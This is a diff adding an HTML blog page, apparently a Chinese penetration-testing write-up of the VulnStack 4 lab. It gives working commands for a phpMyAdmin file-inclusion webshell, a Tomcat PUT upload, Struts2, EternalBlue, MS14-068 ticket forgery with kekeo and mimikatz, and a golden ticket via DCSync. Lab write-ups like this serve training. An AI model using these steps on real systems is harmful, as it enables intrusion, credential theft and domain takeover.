@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 6.2.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="E-Maker">
+  
+
+  
+
+  
+
+  <title>VulnStack 4 | E-Maker&#39;s Home</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/imemaker/imemaker.github.io/favicon.ico">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
+  
+
+  
+<link rel="stylesheet" href="/imemaker/imemaker.github.io/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://emakerx.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F34f0d21e-01d0-4413-9939-8e40e36c74ab%2F9.jpg?table=block&amp;id=922f0115-a88b-492b-89ed-3517d429f22b&amp;spaceId=d7e178a2-4e91-41b3-a44b-6d87daef74c0&amp;width=2000&amp;userId=&amp;cache=v2)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/imemaker/imemaker.github.io/">
+        
+          E-Maker&#39;s Home
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/imemaker/imemaker.github.io/">首页</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">VulnStack 4</h1>
+          <h2 class="title-sub-wrap">
+            <strong>E-Maker</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2021-06-29T09:19:09.000Z" itemprop="datePublished">2021-06-29</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/imemaker/imemaker.github.io/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/">📒 技术博客</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/VulnStack/">📒 VulnStack</a></li>
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">🏷️ 渗透测试</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/">🏷️ 内网靶机</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/ms14-068/">🏷️ ms14-068</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/phpmyadmin/">🏷️ phpmyadmin</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/tomcat/">🏷️ tomcat</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/struts2/">🏷️ struts2</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/ms17-010/">🏷️ ms17-010</a></li>
+  
+    <li><a href="/imemaker/imemaker.github.io/tags/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/">🏷️ 黄金票据</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="VulnStack内网靶机四"><a href="#VulnStack内网靶机四" class="headerlink" title="VulnStack内网靶机四"></a>VulnStack内网靶机四</h1><h2 id="获取WEB权限"><a href="#获取WEB权限" class="headerlink" title="获取WEB权限"></a>获取WEB权限</h2><h3 id="1）phpmyadmin文件包含-CVE-2018-12613"><a href="#1）phpmyadmin文件包含-CVE-2018-12613" class="headerlink" title="1）phpmyadmin文件包含  CVE-2018-12613"></a>1）<code>phpmyadmin</code>文件包含  <code>CVE-2018-12613</code></h3><ul>
+<li><code>select &lt;?php phpinfo();?&gt;</code>产生临时<code>session</code>文件，使用文件包含进行php代码执行。<code>sessionid</code>为浏览器<code>cookie</code>中<code>phpmyadmin</code>值<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_0cf324578d44a7a40a9e39d27a6fc8ac</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li><code>phpinfo</code>可以成功执行，接着尝试<code>select &lt;?php @eval($_POST[apple]);?&gt;</code>写入木马，亲测这种思路是不行的</li>
+<li>转换思想，既然<code>phpinfo</code>可以成功被执行，代表<code>php</code>代码可以执行，这里使用<code>php</code>来写入木马<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php $file = fopen(&quot;shell.php&quot;,&quot;w&quot;);fwrite($file,&quot;&lt;?php @eval(\$_POST[apple]);?&gt;&quot;);fclose($file);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+<p>注意<code>$</code>前的<code>\</code>是不能省略的，否则写入的木马就会变成<code>&lt;?php @eval();?&gt;</code></p>
+</blockquote>
+</li>
+<li>写入<code>sql</code>语句后再次访问<code>session</code>文件，执行<code>php</code>代码</li>
+</ul>
+<h3 id="2）Tomcat-PUT方法任意写文件漏洞-CVE-2017-12615"><a href="#2）Tomcat-PUT方法任意写文件漏洞-CVE-2017-12615" class="headerlink" title="2）Tomcat PUT方法任意写文件漏洞  CVE-2017-12615"></a>2）<code>Tomcat</code> PUT方法任意写文件漏洞  <code>CVE-2017-12615</code></h3><ul>
+<li>tomcat版本：8.5.19</li>
+<li>访问首页，抓包，修改请求方法为<code>PUT</code>，包内容添加<code>jsp</code>木马，连接即可获取<code>webshell</code></li>
+<li>1.jsp后的<code>/</code>不能省略<br><img src="https://emakerx.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fcec0ce11-e872-4e48-ab0d-30492f1cd3c8%2F2.png?table=block&id=98662e58-3754-402f-a900-8cbc9101ca28&spaceId=d7e178a2-4e91-41b3-a44b-6d87daef74c0&width=1550&userId=&cache=v2"></li>
+</ul>
+<h3 id="3）Struts2-045-2"><a href="#3）Struts2-045-2" class="headerlink" title="3）Struts2-045-2"></a>3）<code>Struts2-045-2</code></h3><ul>
+<li>漏洞利用工具 <code>https://github.com/1ight-2020/Struts2Scanner</code><br><img src="https://emakerx.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0637d6ee-6326-4b26-9d80-2f34519c77c7%2F1.png?table=block&id=5aa7bdf6-0a5d-4807-a545-428a2dbd9178&spaceId=d7e178a2-4e91-41b3-a44b-6d87daef74c0&width=2000&userId=&cache=v2"></li>
+</ul>
+<h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><ul>
+<li>此部分后面单独进行练习</li>
+</ul>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h3><ul>
+<li>永恒之蓝打入<code>win7</code>，<code>mimikatz</code>抓取密码</li>
+</ul>
+<h3 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h3><h4 id="ms14-068-exe"><a href="#ms14-068-exe" class="headerlink" title="ms14-068.exe"></a><code>ms14-068.exe</code></h4><ul>
+<li>查看用户的<code>sid</code>: <code>whoami /user</code></li>
+<li><code>ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址</code> </li>
+<li><code>mimikatz # kerberos::purge  //清空票据</code></li>
+<li><code>mimikatz # kerberos::ptc 票据文件地址</code></li>
+</ul>
+<h4 id="kekeo-exe（https-github-com-gentilkiwi-kekeo）"><a href="#kekeo-exe（https-github-com-gentilkiwi-kekeo）" class="headerlink" title="kekeo.exe（https://github.com/gentilkiwi/kekeo）"></a><code>kekeo.exe</code>（<code>https://github.com/gentilkiwi/kekeo</code>）</h4><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge //清空凭据信息</span><br><span class="line">exploit::ms14068 /domain:demo.com /user:douser /password:Dotest123 /ptt</span><br></pre></td></tr></table></figure>
+<p><img src="https://emakerx.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc8b64a32-3035-4ea6-af23-6215965611cf%2F3.png?table=block&id=5892c4e1-cbc8-45b9-9073-24c359b64505&spaceId=d7e178a2-4e91-41b3-a44b-6d87daef74c0&width=1410&userId=&cache=v2"><br>这里注意，在成功后，使用<code>DC</code>的<code>IP</code>地址进行访问时，还是不可访问的，是因为使用<code>ip</code>地址进行<code>ipc</code>连接时，采用的认证协议为<code>NTLM</code>协议；使用<code>DC</code>的主机名访问可以成功，是因为使用主机名进行<code>ipc</code>连接时，采用的认证协议为<code>kerberos</code>协议。也就是说，账密、<code>hash</code>等采用的是<code>NTLM</code>协议；<code>ticket</code>等票据采用的是<code>kerberos</code>协议<br><img src="https://emakerx.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F941b5aa8-b9c8-42ca-9cb0-384f1ea7147b%2F4.png?table=block&id=c9411674-53f0-4e2a-ac98-d96c40712f30&spaceId=d7e178a2-4e91-41b3-a44b-6d87daef74c0&width=900&userId=&cache=v2"></p>
+</blockquote>
+<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><ul>
+<li><code>privilege::debug</code></li>
+<li>抓取<code>krbtgt</code>的<code>hash</code><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.com /all /csv</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>抓取<code>krbtgt</code>的<code>sid</code><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.com /user:krbtgt</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+<li>制作票据：<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /admin:system /domain:test.com /sid:S-1-5-21-97341123-1865264218-933115267 /krbtgt:95972cdf7b8dde854e74c1871f6d80a0 /ticket:ticket.kirbi&quot; exit</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+</ul>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+      <div class="card-cover" background-image-lazy data-img="https://emakerx.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4ec1bd23-1480-4c3f-976d-7fb680320cfe%2F10.jpg?table=block&amp;id=3b203ee9-48c6-4306-b17a-61af4afd0a66&amp;spaceId=d7e178a2-4e91-41b3-a44b-6d87daef74c0&amp;width=2000&amp;userId=&amp;cache=v2"></div>
+    
+    <div class="card-text">
+      
+        <a href="/imemaker/imemaker.github.io/2021/07/05/VulnStack-5/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">VulnStack 5</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+      <div class="card-cover" background-image-lazy data-img="https://emakerx.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F53e01561-b181-4fc8-9521-235612ea10a5%2F8.jpg?table=block&amp;id=86402434-8d32-4881-910f-12a393d427da&amp;spaceId=d7e178a2-4e91-41b3-a44b-6d87daef74c0&amp;width=2000&amp;userId=&amp;cache=v2"></div>
+    
+    <div class="card-text">
+      
+        <a href="/imemaker/imemaker.github.io/2021/06/21/VulnStack-3/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">VulnStack 3</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://s.gravatar.com/avatar/2d6b803eea37de0257620d5fabee7e64?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="E-Maker">
+    
+    
+      <h2>E-Maker</h2>
+    
+    
+      <p>一枚小白</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>12</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        3
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        39
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+<section class="widget-toc widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-toc" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M134.50666666 767.46666668H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.23999999v50.13333333c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H134.50666666c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.13333333c0.10666668-27.73333333 22.50666668-50.24000001 50.24000001-50.24000001zM84.37333332 541.65333333h326.18666669c27.73333333 0 50.24000001 22.39999999 50.23999999 50.13333334v50.24000001c0 27.73333333-22.50666668 50.24000001-50.24000002 50.23999999H84.37333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.23999999v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333334zM134.50666666 315.83999999H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.24000001v50.24000001c0 27.73333333-22.50666668 50.13333334-50.24000001 50.13333333H134.50666666c-27.73333333 0-50.24000001-22.39999999-50.23999999-50.13333333v-50.24000001c0.10666668-27.84000001 22.50666668-50.24000001 50.24000001-50.23999999zM209.81333332 89.91999999h326.18666671c27.73333333 0 50.24000001 22.39999999 50.23999997 50.13333335v50.23999999c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H209.81333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333333zM692.05333333 623.36l274.66666669 176.00000002c23.36000001 14.93333333 30.08 45.97333334 15.14666666 69.33333332L954.77333334 910.93333333c-14.93333333 23.25333334-45.97333334 30.08-69.33333335 15.14666667l-274.66666666-176c-23.36000001-14.93333333-30.08-45.97333334-15.14666667-69.33333333l27.09333334-42.24000001c14.93333333-23.36000001 46.08000001-30.08 69.33333333-15.14666666z" fill="currentColor"></path>
+</svg>
+    <span>TOC</span>
+  </div>
+  <div class="widget-body">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96WEB%E6%9D%83%E9%99%90"><span class="toc-number">1.</span> <span class="toc-text">获取WEB权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-CVE-2018-12613"><span class="toc-number">1.1.</span> <span class="toc-text">1）phpmyadmin文件包含  CVE-2018-12613</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89Tomcat-PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E-CVE-2017-12615"><span class="toc-number">1.2.</span> <span class="toc-text">2）Tomcat PUT方法任意写文件漏洞  CVE-2017-12615</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%89Struts2-045-2"><span class="toc-number">1.3.</span> <span class="toc-text">3）Struts2-045-2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8"><span class="toc-number">2.</span> <span class="toc-text">Docker逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ms17-010"><span class="toc-number">3.1.</span> <span class="toc-text">ms17-010</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms14-068"><span class="toc-number">3.2.</span> <span class="toc-text">ms14-068</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.</span> <span class="toc-text">黄金票据</span></a></li></ol>
+  </div>
+</section>
+
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>博客主题更新，主题详情查看https://github.com/miiiku/flex-block</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+        <li class="categorys-list-item">
+          <a href="/imemaker/imemaker.github.io/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/">
+            技术博客 (11)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/imemaker/imemaker.github.io/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/VulnStack/">
+            VulnStack (6)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/imemaker/imemaker.github.io/categories/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">
+            个人博客 (1)
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/imemaker/imemaker.github.io/tags/CVE-2020-1472/" style="font-size: 10px;" class="tags-cloud-0">CVE-2020-1472</a> <a href="/imemaker/imemaker.github.io/tags/CVE-2021-44228/" style="font-size: 10px;" class="tags-cloud-0">CVE-2021-44228</a> <a href="/imemaker/imemaker.github.io/tags/CobaltStrike/" style="font-size: 10px;" class="tags-cloud-0">CobaltStrike</a> <a href="/imemaker/imemaker.github.io/tags/Hexo/" style="font-size: 10px;" class="tags-cloud-0">Hexo</a> <a href="/imemaker/imemaker.github.io/tags/Log4j2/" style="font-size: 10px;" class="tags-cloud-0">Log4j2</a> <a href="/imemaker/imemaker.github.io/tags/MSF/" style="font-size: 10px;" class="tags-cloud-0">MSF</a> <a href="/imemaker/imemaker.github.io/tags/NTLM/" style="font-size: 10px;" class="tags-cloud-0">NTLM</a> <a href="/imemaker/imemaker.github.io/tags/RCE/" style="font-size: 10px;" class="tags-cloud-0">RCE</a> <a href="/imemaker/imemaker.github.io/tags/Windows%E8%AE%A4%E8%AF%81/" style="font-size: 10px;" class="tags-cloud-0">Windows认证</a> <a href="/imemaker/imemaker.github.io/tags/access-token/" style="font-size: 10px;" class="tags-cloud-0">access token</a> <a href="/imemaker/imemaker.github.io/tags/cobaltstrike/" style="font-size: 10px;" class="tags-cloud-0">cobaltstrike</a> <a href="/imemaker/imemaker.github.io/tags/cs-msf%E4%BA%92%E8%BD%AC/" style="font-size: 10px;" class="tags-cloud-0">cs/msf互转</a> <a href="/imemaker/imemaker.github.io/tags/joomla/" style="font-size: 10px;" class="tags-cloud-0">joomla</a> <a href="/imemaker/imemaker.github.io/tags/kerberos/" style="font-size: 10px;" class="tags-cloud-0">kerberos</a> <a href="/imemaker/imemaker.github.io/tags/ms14-058/" style="font-size: 10px;" class="tags-cloud-0">ms14-058</a> <a href="/imemaker/imemaker.github.io/tags/ms14-068/" style="font-size: 14px;" class="tags-cloud-4">ms14-068</a> <a href="/imemaker/imemaker.github.io/tags/ms17-010/" style="font-size: 12px;" class="tags-cloud-2">ms17-010</a> <a href="/imemaker/imemaker.github.io/tags/ms17-010%E9%97%B4%E6%8E%A5%E5%88%A9%E7%94%A8/" style="font-size: 10px;" class="tags-cloud-0">ms17-010间接利用</a> <a 